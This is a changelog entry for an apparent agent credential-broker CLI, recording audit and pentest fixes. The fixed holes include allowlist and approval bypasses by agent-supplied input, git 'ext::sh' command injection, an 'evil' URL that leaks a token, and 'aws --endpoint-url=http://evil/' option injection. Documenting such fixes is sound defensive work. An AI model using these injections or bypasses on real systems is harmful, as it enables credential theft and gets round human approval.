@@ -7,6 +7,250 @@ and this project follows [Semantic Versioning](https://semver.org/) with
 
 ## [Unreleased]
 
+## [0.6.4] — 2026-09-15 — fix(security): enforcement hardening from external audit (ISSUE-KVD-CLI-B78ED5)
+
+Security release. Remediates an external static security audit of the public
+`kvendra-cli` code by **Salva Ferrer** (avtn.es), plus two additional issues
+found during an in-house adversarial pass. The audit's crypto core (Argon2id,
+AES-256-GCM, ed25519 grant signing, OAuth PKCE) held up; the defects were all
+in the **authorization / enforcement** layer — precisely the differentiator the
+CLI is meant to provide — so several fail-open paths were fail-closed. See
+`THREAT-MODEL.md` for the design-level items (C3/H1/H3) and their status.
+
+### Fixed — critical
+
+- **C1 — empty `profile_id` bypassed the allowlist AND approval.** A
+  `tools/call` with an empty `profile_id` skipped allowlist enforcement
+  (`if !profile_id.is_empty()`) and was treated as non-destructive by the
+  approval layer, so `kvendra.shell` could run an arbitrary binary with no
+  allowlist and no confirmation. Every catalog primitive is credential-bound,
+  so an empty `profile_id` is now a hard deny (`empty_profile_denied`).
+  `src/mcp/server.rs`.
+- **C2 — the shell `binaries:` allowlist was inert.** The enforcer read the
+  binary from the key `bin`, but the `kvendra.shell` primitive emits `binary`,
+  so the constraint never matched and any binary ran. The wire field name is
+  now a shared constant (`primitives::shell::BINARY_FIELD`) read by both sides;
+  a `binaries:` constraint with no `binary` field in the payload now **fails
+  closed**. `src/allowlist/enforcer.rs`, `src/primitives/shell.rs`.
+- **C4 — a profile with a secret but no allowlist YAML was fail-open.** The
+  enforcer returned "allowed" when the allowlist file was absent, and
+  `kvendra secret add` never creates one, so the permissive state was reachable
+  in normal use. Absence of an allowlist is now a hard deny
+  (`missing_allowlist_denied`, `KvendraError::MissingAllowlist`).
+  `src/mcp/server.rs`.
+
+### Fixed — high
+
+- **H2 — mutating operations skipped the `ask-destructive` prompt.** The
+  destructive-catalog predicates (`s3_sync.delete`, `git.tag.force`,
+  mutating HTTP verbs, `github.update_issue` state=closed) read flat fields
+  that live in the inner `args` payload, but the approval layer passed the
+  whole MCP envelope, so those predicates always saw the field as absent and
+  reported non-destructive — no confirmation prompt. The approval layer now
+  reads the inner payload. `src/approval/mod.rs`.
+- **H4 — the escape-hatch per-session quota was never enforced.**
+  `unsafe_max_uses_per_session` was declared in the DSL but never read, so
+  `kvendra.unsafe.raw_token` (which returns the plaintext credential) had no
+  per-session cap. The dispatcher now enforces it (`unsafe_quota_exceeded`,
+  default 1/session). `src/mcp/server.rs`, `src/allowlist/dsl.rs`.
+- **H5 — `git clone` URL enabled RCE and option injection.** `git clone`
+  received the URL unvalidated, so `ext::sh -c '<cmd>'` (a git remote helper)
+  was arbitrary command execution and a leading `-` was option injection. URLs
+  are now validated (scheme allowlist, no `ext::`/`transport::` helpers, no
+  leading `-`), a `--` terminator is inserted, and every git invocation runs
+  with `-c protocol.ext.allow=never -c protocol.file.allow=user`.
+  `src/primitives/git.rs`.
+
+### Fixed — medium / hardening
+
+- **URL allowlist regex was a substring match.** `url_pattern_regex` used
+  `Regex::is_match`, so a pattern pinning the host also matched a hostile URL
+  that merely *contained* it (e.g. `https://evil/?x=https://api.github.com/`),
+  leaking the profile's Bearer token. URL patterns are now start-anchored.
+  `src/allowlist/enforcer.rs`.
+- **The generic HTTP broker followed redirects with the credential attached.**
+  `kvendra.http` now uses `redirect::Policy::none()`, so a `3xx` is returned to
+  the caller and the secret never follows a `Location:` to an un-vetted host.
+  `src/primitives/http.rs`.
+- **Detection layer widened.** Added Slack, Stripe live, Google API key and
+  GitLab PAT patterns to the inbound/outbound secret detector.
+  `src/detection/patterns.rs`.
+- **H1 — audit-export bundles now carry an honest trust-model note.** The
+  self-contained bundle embeds the symmetric HMAC seed, so offline
+  verification proves integrity but not authenticity; a `security_note` field
+  now states this. Asymmetric signing is tracked as a design follow-up.
+  `src/audit/export/bundle.rs`.
+
+### Fixed — cycle 2 (beyond the external audit)
+
+- **Path traversal via `profile_id`.** The agent-supplied `profile_id` was
+  interpolated into vault paths (`allowlists/<id>.yaml`, `secrets/<id>.blob`)
+  with no validation, so `../…` or `/` could traverse. The dispatcher now
+  validates the id against `[A-Za-z0-9._-]` and rejects `..`
+  (`invalid_profile_denied`). `src/primitives/mod.rs`, `src/mcp/server.rs`.
+- **AppleScript approval reason hardening.** The macOS approval dialog reason
+  is built partly from the agent-supplied `profile_id`; control characters are
+  now stripped in addition to escaping `"`/`\`. `src/keychain_acl/macos.rs`.
+
+### Fixed — cycle 3 (owner pre-release adversarial review of the command surface)
+
+- **A1 — `kvendra unlock --extend` extended the session with no
+  authentication.** The extend path bumped the on-disk session TTL with no
+  master password, no presence check and no anti-captured-env guard, so any
+  process running as the owner could keep a session — and therefore the
+  broker's credential access — alive indefinitely by looping
+  `unlock --extend --ttl <max>`, defeating the absolute-TTL gate the design
+  advertises, all without ever knowing the master password. Extend now
+  re-authenticates with the master password (verified in a transient vault
+  that is locked immediately), exactly like `kvendra bypass`. The `--extend`
+  flag no longer conflicts with `KVENDRA_PASSWORD`, so unattended automation
+  can still supply the password explicitly. `src/cli/unlock.rs`.
+
+  Note: this closes the CLI-level footgun. A same-uid attacker who can craft a
+  session blob directly can still forge its TTL — that is the C3 boundary
+  (`ISSUE-KVD-CLI-B12B18`), whose fix (hardware-backed wrapping) makes the blob
+  unforgeable. The rest of the privileged command surface (`config *`,
+  `recovery-codes regenerate`, `rebind-home`, `recover`, `bypass`,
+  `mcp-password`) was reviewed command-by-command and already re-authenticates.
+
+### Fixed — cycle 4 (adversarial pentest: broker + vault + integrity controls)
+
+An owner-directed "try to break it" pass, each item reproduced with a live PoC
+against the running broker and re-verified fixed. Behaviour changes are flagged.
+
+- **N2 — arbitrary code execution via `kvendra.npm publish`.** `npm publish`
+  runs the package's `prepublishOnly` / `prepare` / `prepack` lifecycle scripts
+  from the caller-controlled `cwd`, so an agent allowed only to "publish"
+  achieved arbitrary code execution, bypassing the whole allowlist/approval
+  model and the shell primitive's "no arbitrary exec" guarantee. **All npm
+  invocations now pass `--ignore-scripts`.** `src/primitives/npm.rs`.
+- **N1 — the master password leaked to brokered subprocesses.** Subprocesses
+  (the real tool, an npm lifecycle script, or a PATH-planted trojan) inherited
+  the full environment of `kvendra mcp serve`, including `KVENDRA_MCP_PASSWORD`.
+  Every child now has the sensitive `KVENDRA_*` credential vars scrubbed.
+  `src/primitives/spawn.rs` (new), applied across all subprocess primitives.
+- **N5 — option injection in aws / npm / pypi.** The H5 leading-`-` guard was
+  applied to `git` only; `aws s3 cp --endpoint-url=http://evil/ …` (redirecting
+  AWS to an attacker endpoint) and similar reached the tool as options. All
+  user-controlled positional args (s3 src/dst, distribution/function id,
+  package spec, dist path) now reject a leading `-`, with `--` terminators.
+  `src/primitives/{aws,npm,pypi}.rs`.
+- **A5 — config integrity (REQ-KVD-008) bypass. BEHAVIOUR CHANGE.** The `_hmac`
+  trailer was only recognised as the *last* line, so appending a setting after
+  it (or removing it) made the config read as "unsigned"; it took effect and
+  was then silently re-signed on the next unlock by
+  `auto_migrate_config_if_needed`. A same-uid attacker could thus set
+  `approval.mode = "silent"` (disabling all confirmations) undetected. **When a
+  vault is available, a config that is not validly signed is now REFUSED as
+  tampered**, and the silent auto-re-sign was removed. Legacy pre-0.4 unsigned
+  configs must be reset (delete `~/.kvendra/config.toml`). `src/config.rs`,
+  `src/cli/unlock.rs`.
+- **A6 — allowlist integrity bypass. BEHAVIOUR CHANGE.** The parallel bug in the
+  enforcer: nulling `allowlist_hmac_hex` in `profiles/<id>.json` (after
+  rewriting the YAML permissively) made the enforcer auto-sign and adopt the
+  attacker's allowlist. **A present allowlist YAML with no stored signature is
+  now refused as tampered**, not auto-signed. `src/mcp/server.rs`.
+- **A2 — PATH-hijack credential theft (partial).** A trojan tool earlier in
+  PATH runs under an allowlisted name and receives the injected credential. The
+  hardened spawn now drops empty / `.` / relative PATH entries, blocking the
+  relative-dir supply-chain vector; an absolute-dir plant by a same-uid
+  attacker remains (design follow-up: pinned tool paths). `src/primitives/spawn.rs`.
+
+### Known residual — cycle 4 (documented, tracked, not fully code-fixed)
+
+- **A3 — no unlock lockout.** `kvendra unlock` has no failed-attempt lockout;
+  the ~1 s Argon2id cost is the only online rate limiter (an offline blob
+  attack bypasses any online lockout anyway). A weak master password is
+  brute-forceable at ~1/s. Consider a backoff. Tracked.
+- **A4 — corruption DoS.** A same-uid attacker corrupting `config.toml` /
+  `sentinel.blob` makes `unlock` fail; the config case now gives a clear tamper
+  message (A5), the sentinel case still surfaces a raw parse error.
+- **N4 — audit-log truncation is undetected.** The HMAC chain detects edits to
+  existing rows but not deletion of the tail: a same-uid attacker can truncate
+  `audit.db` to erase evidence and `kvendra audit --verify` still passes (no
+  length commitment / external anchor). Design follow-up.
+- **C3 — the session blob is forgeable, not only readable.** The pentest showed
+  a same-uid process can decrypt the blob to recover every stored secret in
+  plaintext AND forge the blob (arbitrary TTL / key) while the vault is
+  unlocked. Hardware-backed wrapping (`ISSUE-KVD-CLI-B12B18`) is the fix.
+
+### Fixed — cycle 5 (pentest: same-uid file swaps, offline files, misuse/robustness)
+
+- **S1b — allowlist not bound to its profile.** The allowlist HMAC authenticates
+  the YAML content but not which profile it belongs to, so a same-uid attacker
+  (even with the vault locked — it is a file copy, no key) could copy profile A's
+  allowlist + its valid HMAC into profile B's slots to widen B. The enforcer now
+  rejects a spec whose declared `profile_id` differs from the profile it is used
+  for. `src/mcp/server.rs`. (`secret set-allowlist` already checked this at sign
+  time; this closes the runtime gap.)
+- **S4c — a malformed JSON-RPC line terminated `mcp serve` (DoS).** Any
+  un-parseable line broke the serve loop, so one bad line (a hostile client, or a
+  stray write from a subprocess touching the pipe) killed the broker session. The
+  loop now replies with a `-32700` parse error and keeps serving; only a genuine
+  I/O error ends it. `src/mcp/server.rs`.
+
+### Robustness confirmations (no fix needed)
+
+- `kvendra init` on an existing vault refuses (no clobber, no data loss, no
+  password change) — it points to `kvendra recover`.
+- On-disk Argon2id params are production high-cost (m = 64 MiB, t = 3, p = 1) for
+  the sentinel and every secret blob, so an offline attack on the encrypted files
+  is bounded by the KDF + master-password strength (threat vector V8).
+- JSON-RPC fuzzing (malformed types, deep nesting, 1 MB fields) produced no
+  panics or memory-safety issues.
+
+### Known residual — cycle 5 (tracked, not code-fixed)
+
+- **S1a — secret blob not bound to its profile** (`ISSUE-KVD-CLI-571DDB`). A
+  same-uid attacker can copy `secrets/A.blob` over `secrets/B.blob` so profile B
+  resolves A's credential (privilege confusion; chained with A2 it exfiltrates
+  it). The fix is a blob-format change (embed the profile id in the AEAD) +
+  migration, deliberately NOT auto-run on unlock so it never silently rewrites a
+  production vault. New secrets should be v2-bound; existing ones migrate on an
+  explicit `secret migrate` / rotate. Subsumed by the C3 hardware-backing fix for
+  the unlocked-vault case.
+
+### Design-level items (documented, not code-patched — see THREAT-MODEL.md)
+
+- **C3** — the session-blob wrap key is machine-bound but derived from public
+  inputs, so any process running as your uid while the vault is unlocked can
+  read the blob. This is `ADR-KVD-029` behaviour; `THREAT-MODEL.md` V2 is
+  corrected to state it honestly, and hardware-backed wrapping is the fix.
+- **H3** — presence-gated approval is macOS-only; on Linux the only way to
+  operate is `KVENDRA_APPROVAL_MODE=silent`. Cross-platform presence is future
+  work.
+
+### Tests
+
+- New adversarial regression suite `tests/security_audit_salva.rs` (11 tests):
+  one attack per finding, executed against the real broker in a sandbox. Red on
+  0.6.3, green on 0.6.4.
+- Fixed the enforcer unit tests that used the wrong `bin` field (they were
+  complicit in C2), and flipped the "no allowlist → allowed" test to the new
+  fail-closed contract.
+
+### Documentation
+
+- New user-facing page [`docs/security/protection-levels.md`](docs/security/protection-levels.md):
+  in plain language, what the vault protects, what compromises you (same-uid
+  while unlocked; binary substitution), what you can do today to raise your
+  protection, and the opt-in roadmap (hardware-backed keys, ephemeral scoped
+  credentials, server-assisted unlock, remote broker).
+- New public advisory [`docs/security/advisory-cli-0.6.4.md`](docs/security/advisory-cli-0.6.4.md)
+  with per-finding detail and credits.
+- `SECURITY.md` and `README.md` now link the CLI security docs; the README
+  status line no longer claims the binary "does not yet exist".
+- The vault key-protection direction is ratified in `ADR-KVD-CLI-64CD49`
+  (defaults: everything opt-in, default level stays **basic**/software-only,
+  hardware and server-assist are opt-in, `mcp serve` caches presence within a
+  bounded window) with the execution plan in `ROAD-KVD-CLI-393064`.
+
+### Acknowledgements
+
+Thanks to **Salva Ferrer** (avtn.es) for the responsible, high-signal audit,
+and to the broader community for pushing Kvendra to hold the CLI to the
+security bar it promises.
+
 ## [0.6.3] — 2026-06-12 — fix(security): allowlist DSL rejects unknown keys (ISSUE-KVD-CLI-1B6440)
 
 Security hardening, fail-closed. An unknown key in an allowlist YAML
